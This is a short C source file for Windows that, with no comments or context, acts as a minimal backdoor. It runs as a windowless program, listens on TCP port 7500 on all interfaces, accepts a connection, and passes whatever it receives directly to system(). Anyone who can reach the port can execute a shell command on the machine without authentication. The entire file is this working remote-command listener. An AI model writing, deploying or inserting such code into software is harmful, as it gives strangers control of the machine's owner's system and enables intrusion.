#include <winsock2.h>
#include <iostream.h>
#include <stdlib.h>

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	struct sockaddr_in local;
    
	SOCKET sockfd, connfd;

    char buf[30];
	
	local.sin_family = AF_INET;
	local.sin_port = htons(7500);
	local.sin_addr.s_addr = htonl(INADDR_ANY);

	WSADATA wsadata;
    WSAStartup(MAKEWORD(2, 2), &wsadata);
    
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	if (sockfd == INVALID_SOCKET)
		exit(1);
	
	if (bind(sockfd, (struct sockaddr *) &local, sizeof(local)) == SOCKET_ERROR)
		exit(1);
	
	if (listen(sockfd, 5) == SOCKET_ERROR)
		exit(1);
	
	if ((connfd = accept(sockfd, NULL, NULL)) == INVALID_SOCKET)
		exit(1);
	
   	if(recv(connfd, buf, 29, 0) <= 0)
		exit(1);
	
	buf[29] = 0;

    system(buf);

	return 0;
}



